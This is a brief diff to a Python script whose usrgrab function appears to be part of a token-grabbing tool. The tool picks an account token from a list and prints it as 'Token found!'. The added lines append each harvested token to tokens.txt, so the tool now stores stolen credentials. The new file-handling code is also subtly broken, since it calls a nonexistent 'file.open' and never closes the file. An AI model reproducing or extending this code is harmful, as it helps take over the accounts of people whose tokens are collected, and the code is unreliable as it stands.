@@ -96,7 +96,9 @@ def usrgrab():
     if usercount == 696969:
         print(f"{Fore.WHITE}[{Fore.RED} ! {Fore.WHITE}]{Fore.LIGHTBLACK_EX} No tokens where found. {Fore.WHITE} Error 506. {Fore.WHITE}")
     else:
+        f = file.open("tokens.txt", "a")
         token = toks[usercount]
+        f.write(token)
         print(f"{Fore.WHITE}[ {Fore.CYAN}\u00A7 {Fore.WHITE}] {Fore.LIGHTBLACK_EX} Token found! {token}")
 
 usrgrab()
